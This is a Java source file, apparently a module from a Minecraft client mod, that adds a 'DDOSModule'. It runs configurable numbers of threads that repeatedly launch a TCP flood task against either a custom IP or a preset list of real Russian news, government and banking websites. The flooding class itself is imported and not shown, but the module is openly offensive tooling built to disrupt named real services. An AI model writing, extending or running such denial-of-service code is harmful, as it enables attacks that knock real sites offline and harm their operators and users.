package com.kisman.cc.module.misc;

import com.kisman.cc.module.*;
import com.kisman.cc.gui.csgo.components.Slider;
import com.kisman.cc.settings.Setting;
import com.kisman.cc.util.process.web.TCPDDos;
import i.gishreloaded.gishcode.utils.visual.ChatUtils;

import java.util.Arrays;
import java.util.concurrent.*;

public class DDOSModule extends Module {
    public final Setting delay = new Setting("Delay", this, 100, 30, 3000, Slider.NumberType.TIME);
    public final Setting threads = new Setting("Threads", this, 10, 1, 100, true);
    public final Setting timeOut = new Setting("TimeOut", this, 30, 5, 60, Slider.NumberType.TIME);

    private final Setting ipMode = new Setting("Ip Mode", this, IpMode.Custom);
    private final Setting russianSites = new Setting("Russian Sites", this, "vesti.ru", Arrays.asList("lenta.ru","ria.ru","rbc.ru","www.rt.com","kremlin.ru","smotrim.ru","tass.ru","tvzvezda.ru","vsoloviev.ru","1tv.ru","vesti.ru","sberbank.ru","zakupki.gov.ru", "russian.rt.com"));

    public final Setting debug = new Setting("Debug", this, true);


    public static DDOSModule instance;
    private ScheduledExecutorService threadPool;
    public static String customIp = "";

    public DDOSModule() {
        super("DDOSModule", Category.MISC);

        instance = this;

        setmgr.rSetting(delay);
        setmgr.rSetting(threads);
        setmgr.rSetting(timeOut);
        setmgr.rSetting(ipMode);
        setmgr.rSetting(russianSites);
        setmgr.rSetting(debug);
    }

    public void onEnable() {
        if(mc.player == null || mc.world == null) ChatUtils.message("DDos started");
        threadPool = Executors.newScheduledThreadPool(threads.getValInt());
        for (int i = 0; i < threads.getValInt(); i++) {
            threadPool.scheduleWithFixedDelay(new TCPDDos(), 1, timeOut.getValLong(), TimeUnit.SECONDS);
        }
    }

    public void onDisable() {
        if(threadPool != null) threadPool.shutdownNow();
        threadPool = null;
        super.setDisplayInfo("");
        if(mc.player == null || mc.world == null) return;
        ChatUtils.message("DDos stopped");
    }

    public void update() {
        super.setDisplayInfo("[" + getCurrentAddress() + "]");
    }

    public String getCurrentAddress() {
        return ipMode.getValString().equals("Custom") ? customIp : russianSites.getValString();
    }

    public enum IpMode {Custom, Russian}
}
